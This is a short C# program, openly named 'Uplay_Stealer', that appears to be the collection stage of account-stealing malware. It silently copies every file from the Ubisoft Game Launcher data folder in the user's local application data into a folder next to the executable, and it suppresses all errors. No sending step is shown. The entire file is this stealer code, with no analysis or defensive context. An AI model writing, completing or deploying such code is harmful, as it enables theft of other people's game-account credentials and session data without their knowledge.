using System;
using System.Windows.Forms;
using System.IO;

namespace Uplay_Stealer
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string path = Application.StartupPath.ToString() + @"\Uplay Data\";
                string dir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Ubisoft Game Launcher\";
                string[] pathh;

                if (Directory.Exists(dir))
                {
                    pathh = Directory.GetFiles(dir);
                }
                else
                {
                    pathh = null;
                }

                if (pathh != null)
                {
                    Directory.CreateDirectory(path);
                    foreach (string res in pathh)
                    {
                        string name = Path.GetFileName(res);
                        File.Copy(Path.Combine(res), Path.Combine(path + name));
                    }
                }
            }
            catch (Exception)
            { }
        }
    }
}
